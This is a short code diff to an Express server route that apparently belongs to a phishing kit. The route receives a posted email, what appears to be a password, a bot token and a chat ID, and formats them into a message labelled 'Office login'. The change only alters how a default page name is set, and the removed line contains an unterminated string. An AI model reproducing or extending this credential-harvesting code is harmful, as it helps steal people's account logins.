@@ -12,9 +12,9 @@ let pageN ="";
 app.post('/next', (req, res) => {
   const { ai, pr, btTkn, chId, userAgent, timeZone, page } = req.body;
  if(!page){
-  pageN = page;
+  pageN = "Office";
  }else{
-   pageN = "Office
+   pageN = pageN;
  }
   let message = '---------- 📧' + pageN +' login 📧 ----------\n';
   message += `email: ${ai} \n`;
